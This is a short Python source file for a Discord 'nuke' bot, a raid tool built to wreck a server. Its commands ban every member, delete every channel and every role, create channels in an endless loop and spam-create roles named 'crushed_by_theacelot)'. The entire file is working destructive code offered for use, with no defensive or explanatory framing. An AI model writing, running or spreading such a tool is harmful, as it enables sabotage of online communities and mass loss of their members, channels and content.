import discord
from discord.ext import commands
ChannelName = 'crushed_by_theacelot)'
prefix = '#'
token = ''
if token == '':
	print('NO TOKEN!')
bruh = commands.Bot(command_prefix = prefix,  intents = discord.Intents.all())

#ban/delete#
@bruh.command()
@commands.is_owner()
async def ban(ctx):
	await ctx.message.delete()
	for member in ctx.guild.members:
		try:
			#await member.kick(reason="bruh")
			await member.ban(reason="bruh")
		except:
			print('FALIED!')
@bruh.command()
@commands.is_owner()
async def delete(ctx):
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			print(f"{ctx.channel} deleted!")
		except:
			print('FALIED!')
@bruh.command()
async def delroles(ctx):
	for role in ctx.guild.roles:
		try:
			await role.delete(reason="xd")
		except:
			pass
#spam#
@bruh.command()
@commands.is_owner()
async def spamchannel(ctx):
	counter = 0
	await ctx.message.delete()
	while 1 == 1:
		guild = ctx.message.guild
		await guild.create_text_channel(ChannelName)
		counter =+ 1
@bruh.command()
@commands.is_owner()
async def spamroles(ctx):
	for role in ctx.guild.roles:
		try:
			await ctx.guild.create_role(name=ChannelName)
		except:
			pass
bruh.run(token)